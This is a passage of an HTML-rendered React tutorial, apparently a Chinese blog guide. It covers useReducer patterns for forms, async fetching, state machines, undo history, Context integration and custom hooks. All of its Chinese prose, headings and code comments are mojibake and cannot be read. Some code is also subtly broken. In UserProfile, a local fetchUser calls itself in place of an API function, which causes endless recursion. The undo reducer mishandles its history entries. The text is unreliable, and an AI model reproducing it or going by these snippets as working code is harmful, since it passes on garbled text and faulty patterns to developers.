function_">useReducer</span>(reducer, initialState);<br>  <br>  <span class="hljs-comment">// æ”¯æŒä¸­é—´ä»¶é“¾</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">dispatchWithMiddleware</span> = action =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Action:&#x27;</span>, action); <span class="hljs-comment">// æ—¥å¿—ä¸­é—´ä»¶</span><br>    <span class="hljs-title function_">dispatch</span>(action); <span class="hljs-comment">// ç»§ç»­ä¼ é€’</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> [state, dispatchWithMiddleware];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¤æ‚çŠ¶æ€ç®¡ç†å®æˆ˜"><a href="#å¤æ‚çŠ¶æ€ç®¡ç†å®æˆ˜" class="headerlink" title="å¤æ‚çŠ¶æ€ç®¡ç†å®æˆ˜"></a>å¤æ‚çŠ¶æ€ç®¡ç†å®æˆ˜</h3><p><strong>è¡¨å•çŠ¶æ€ç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">formReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;change_field&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        [action.<span class="hljs-property">field</span>]: action.<span class="hljs-property">value</span>,<br>        <span class="hljs-attr">touched</span>: &#123; ...state.<span class="hljs-property">touched</span>, [action.<span class="hljs-property">field</span>]: <span class="hljs-literal">true</span> &#125;<br>      &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;validate&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">errors</span>: <span class="hljs-title function_">validateForm</span>(state) &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;submit&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">isSubmitting</span>: <span class="hljs-literal">true</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;submit_success&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...initialState, <span class="hljs-attr">submitSuccess</span>: <span class="hljs-literal">true</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(formReducer, initialState);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;change_field&#x27;</span>,<br>      <span class="hljs-attr">field</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">name</span>,<br>      <span class="hljs-attr">value</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span><br>    &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¼‚æ­¥æ“ä½œç®¡ç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_START&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">data</span>: action.<span class="hljs-property">payload</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_FAILURE&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">error</span>: action.<span class="hljs-property">error</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(asyncReducer, &#123;<br>    <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span><br>  &#125;);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_START&#x27;</span> &#125;);<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(userId);<br>        <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: data &#125;);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_FAILURE&#x27;</span>, error &#125;);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">fetchUser</span>();<br>  &#125;, [userId]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>çŠ¶æ€æœºæ¨¡å¼ï¼ˆXState æ€æƒ³ï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">stateMachineReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (state.<span class="hljs-property">status</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;idle&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;FETCH&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;loading&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;loading&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;SUCCESS&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-attr">data</span>: action.<span class="hljs-property">data</span> &#125;;<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;FAILURE&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">error</span>: action.<span class="hljs-property">error</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;success&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;RESET&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;error&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;RETRY&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;loading&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-9"><a href="#é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ-9" class="headerlink" title="é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ"></a>é«˜é¢‘é¢è¯•é¢˜ä¸ç ´è§£æ–¹æ¡ˆ</h3><p><strong>Qï¼šä½•æ—¶è¯¥ç”¨ useReducer è€Œä¸æ˜¯ useStateï¼Ÿ</strong></p><p>å†³ç­–æ ‘ï¼š</p><pre class="mermaid">graph TD  A[çŠ¶æ€ç»“æ„å¤æ‚?] -->|æ˜¯| B[useReducer]  A -->|å¦| C{çŠ¶æ€æ›´æ–°é€»è¾‘å¤æ‚?}  C -->|æ˜¯| B  C -->|å¦| D[useState]  E[éœ€è¦è·¨ç»„ä»¶æ›´æ–°?] -->|æ˜¯| B  F[éœ€è¦å¯é¢„æµ‹çŠ¶æ€?] -->|æ˜¯| B</pre><p><strong>Qï¼šå¦‚ä½•é¿å… reducer å‡½æ•°è¿‡å¤§ï¼Ÿ</strong></p><p>ä¼˜åŒ–ç­–ç•¥ï¼š</p><ul><li>æ‹†åˆ† reducerï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">rootReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">user</span>: <span class="hljs-title function_">userReducer</span>(state.<span class="hljs-property">user</span>, action),<br>    <span class="hljs-attr">posts</span>: <span class="hljs-title function_">postsReducer</span>(state.<span class="hljs-property">posts</span>, action)<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ç»„åˆ action åˆ›å»ºå‡½æ•°ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> actions = &#123;<br>  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;increment&#x27;</span> &#125;),<br>  <span class="hljs-attr">addTodo</span>: <span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;add_todo&#x27;</span>, <span class="hljs-attr">payload</span>: text &#125;)<br>&#125;;<br><span class="hljs-comment">// ä½¿ç”¨ï¼šdispatch(actions.increment())</span><br></code></pre></td></tr></table></figure><p><strong>Qï¼šuseReducer å¦‚ä½•å®ç°æ—¶é—´æ—…è¡Œè°ƒè¯•ï¼Ÿ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. æ·»åŠ å†å²è®°å½•</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducerWithHistory</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">const</span> nextState = <span class="hljs-title function_">reducer</span>(state.<span class="hljs-property">current</span>, action);<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">current</span>: nextState,<br>    <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>, &#123; action, <span class="hljs-attr">state</span>: nextState &#125;]<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 2. å®ç°æ’¤é”€/é‡åš</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">undoableReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;UNDO&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">current</span>: state.<span class="hljs-property">history</span>[state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>] &#125;;<br>  &#125;<br>  <span class="hljs-comment">// ...å…¶ä»–actionå¤„ç†</span><br>&#125;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(undoableReducer, &#123;<br>  <span class="hljs-attr">current</span>: initialState,<br>  <span class="hljs-attr">history</span>: [initialState]<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="ä¸-Context-é›†æˆ"><a href="#ä¸-Context-é›†æˆ" class="headerlink" title="ä¸ Context é›†æˆ"></a>ä¸ Context é›†æˆ</h3><p><strong>å…¨å±€çŠ¶æ€ç®¡ç†æ–¹æ¡ˆ</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»º Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StateContext</span> = <span class="hljs-title function_">createContext</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DispatchContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-comment">// å…¨å±€ Provider</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(rootReducer, initialState);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StateContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;state&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DispatchContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;dispatch&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DispatchContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StateContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// è‡ªå®šä¹‰ Hook è®¿é—®</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAppState</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">StateContext</span>);<br>  <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;å¿…é¡»åœ¨ AppProvider å†…ä½¿ç”¨&#x27;</span>);<br>  <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAppDispatch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">DispatchContext</span>);<br>  <span class="hljs-keyword">if</span> (!dispatch) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;å¿…é¡»åœ¨ AppProvider å†…ä½¿ç”¨&#x27;</span>);<br>  <span class="hljs-keyword">return</span> dispatch;<br>&#125;<br><br><span class="hljs-comment">// ç»„ä»¶ä¸­ä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useAppState</span>();<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useAppDispatch</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;increment&#x27; &#125;)&#125;&gt;</span><br><span class="language-xml">      &#123;state.count&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æœ€ä½³å®è·µæ€»ç»“"><a href="#æœ€ä½³å®è·µæ€»ç»“" class="headerlink" title="æœ€ä½³å®è·µæ€»ç»“"></a>æœ€ä½³å®è·µæ€»ç»“</h3><ol><li>çº¯å‡½æ•°åŸåˆ™ï¼šReducer å¿…é¡»æ˜¯çº¯å‡½æ•°ï¼Œä¸äº§ç”Ÿå‰¯ä½œç”¨</li><li>ä¸å¯å˜æ›´æ–°ï¼šå§‹ç»ˆè¿”å›æ–°çŠ¶æ€å¯¹è±¡ï¼Œä¸ä¿®æ”¹åŸçŠ¶æ€</li><li>ç±»å‹å®‰å…¨ï¼šä½¿ç”¨ TypeScript å¼ºåŒ– action ç±»å‹</li></ol><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span> = <br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;increment&#x27;</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;decrement&#x27;</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;set_count&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">number</span> &#125;;<br></code></pre></td></tr></table></figure><ol start="4"><li>é€»è¾‘å¤ç”¨ï¼šæå– reducer åˆ°ç‹¬ç«‹æ–‡ä»¶ä¾¿äºæµ‹è¯•</li><li>åˆç†æ‹†åˆ†ï¼šå¤§å‹åº”ç”¨æŒ‰åŠŸèƒ½åŸŸæ‹†åˆ†å¤šä¸ª reducer</li><li>é¿å…è¿‡åº¦ï¼šç®€å•çŠ¶æ€ä»ä½¿ç”¨ useState</li></ol><h3 id="ä½¿ç”¨åœºæ™¯å†³ç­–é€»è¾‘"><a href="#ä½¿ç”¨åœºæ™¯å†³ç­–é€»è¾‘" class="headerlink" title="ä½¿ç”¨åœºæ™¯å†³ç­–é€»è¾‘"></a>ä½¿ç”¨åœºæ™¯å†³ç­–é€»è¾‘</h3><pre class="mermaid">graph TD  A[çŠ¶æ€ç®¡ç†éœ€æ±‚] --> B{çŠ¶æ€ç»“æ„}  B -->|ç®€å•å€¼| C[useState]  B -->|å¤æ‚å¯¹è±¡| D{æ›´æ–°é€»è¾‘}  D -->|ç®€å•| C  D -->|å¤æ‚| E[useReducer]  A --> F{çŠ¶æ€å…±äº«èŒƒå›´}  F -->|ç»„ä»¶å†…| G[useState/useReducer]  F -->|è·¨ç»„ä»¶| H[Context + useReducer]  A --> I{éœ€è¦æ—¶é—´æ—…è¡Œ/æ’¤é”€}  I -->|æ˜¯| E</pre><h2 id="3-5-è‡ªå®šä¹‰-Hooksï¼ˆå°è£…å¯å¤ç”¨é€»è¾‘ï¼‰"><a href="#3-5-è‡ªå®šä¹‰-Hooksï¼ˆå°è£…å¯å¤ç”¨é€»è¾‘ï¼‰" class="headerlink" title="3.5 è‡ªå®šä¹‰ Hooksï¼ˆå°è£…å¯å¤ç”¨é€»è¾‘ï¼‰"></a>3.5 è‡ªå®šä¹‰ Hooksï¼ˆå°è£…å¯å¤ç”¨é€»è¾‘ï¼‰</h2><h3 id="åŸºç¡€æ¦‚å¿µæ¦‚è¿°-8"><a href="#åŸºç¡€æ¦‚å¿µæ¦‚è¿°-8" class="headerlink" title="åŸºç¡€æ¦‚å¿µæ¦‚è¿°"></a>åŸºç¡€æ¦‚å¿µæ¦‚è¿°</h3><p>è‡ªå®šä¹‰ Hook æ˜¯ä»€ä¹ˆï¼šå°†ç»„ä»¶é€»è¾‘æå–åˆ°å¯é‡ç”¨çš„ JavaScript å‡½æ•°ä¸­çš„æŠ€æœ¯ï¼Œæ˜¯ React é€»è¾‘å¤ç”¨çš„ç»ˆæè§£å†³æ–¹æ¡ˆ</p><p>æ ¸å¿ƒç‰¹å¾ï¼š</p><ul><li>åç§°ä»¥ use å¼€å¤´ï¼ˆå¦‚ useFetchï¼‰</li><li>å¯ä»¥è°ƒç”¨å…¶ä»– Hookï¼ˆå¦‚ useState, useEffectï¼‰</li><li>ä¸åŒ…å« UI æ¸²æŸ“ï¼ŒåªåŒ…å«çŠ¶æ€é€»è¾‘</li></ul><p>ä¸æ™®é€šå‡½æ•°çš„åŒºåˆ«ï¼š</p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">è‡ªå®šä¹‰ Hook</th><th align="left">å·¥å…·å‡½æ•°</th></tr></thead><tbody><tr><td align="left">å¯è°ƒç”¨å…¶ä»– Hook</td><td align="left">âœ…</td><td align="left">âŒ</td></tr><tr><td align="left">çŠ¶æ€éš”ç¦»</td><td align="left">æ¯æ¬¡è°ƒç”¨ç‹¬ç«‹çŠ¶æ€</td><td align="left">æ— çŠ¶æ€&#x2F;é™æ€</td></tr><tr><td align="left">ä½¿ç”¨åœºæ™¯</td><td align="left">ç»„ä»¶é€»è¾‘å¤ç”¨</td><td align="left">æ•°æ®å¤„ç†&#x2F;å·¥å…·ç±»</td></tr></tbody></table><h3 id="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-4"><a href="#æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ-4" class="headerlink" title="æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ"></a>æ ¸å¿ƒæœºåˆ¶æ·±åº¦è§£æ</h3><p><strong>çŠ¶æ€éš”ç¦»åŸç†</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è‡ªå®šä¹‰ Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCounter</span>(<span class="hljs-params">initialValue = <span class="hljs-number">0</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialValue);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> [count, increment];<br>&#125;<br><br><span class="hljs-comment">// ç»„ä»¶Aä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [countA, incA] = <span class="hljs-title function_">useCounter</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// ç‹¬ç«‹çŠ¶æ€</span><br>&#125;<br><br><span class="hljs-comment">// ç»„ä»¶Bä½¿ç”¨</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [countB, incB] = <span class="hljs-title function_">useCounter</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// ç‹¬ç«‹çŠ¶æ€</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å…³é”®åŸç†ï¼šæ¯æ¬¡è°ƒç”¨è‡ªå®šä¹‰ Hook éƒ½ä¼šåˆ›å»ºç‹¬ç«‹çš„çŠ¶æ€å‰¯æœ¬ï¼ˆé—­åŒ…æœºåˆ¶ï¼‰</p><p><strong>Hook è°ƒç”¨è§„åˆ™</strong></p><pre class="mermaid">graph LR  A[å‡½æ•°ç»„ä»¶] --> B[è°ƒç”¨è‡ªå®šä¹‰Hook]  B --> C[å†…éƒ¨è°ƒç”¨React Hook]  C --> D[è¿”å›çŠ¶æ€å’Œé€»è¾‘]  D --> A</pre><p>å¼ºåˆ¶è§„åˆ™ï¼š</p><ul><li>åªåœ¨ React å‡½æ•°ç»„ä»¶æˆ–è‡ªå®šä¹‰ Hook ä¸­è°ƒç”¨</li><li>åªåœ¨é¡¶å±‚è°ƒç”¨ï¼ˆä¸èƒ½åœ¨æ¡ä»¶&#x2F;å¾ªç¯ä¸­ä½¿ç”¨ï¼‰</li><li>å‘½åå¿…é¡»ä»¥ use å¼€å¤´</li></ul><h3 id="è®¾è®¡æ¨¡å¼ä¸æœ€ä½³å®è·µ"><a href="#è®¾è®¡æ¨¡å¼ä¸æœ€ä½³å®è·µ" class="headerlink" 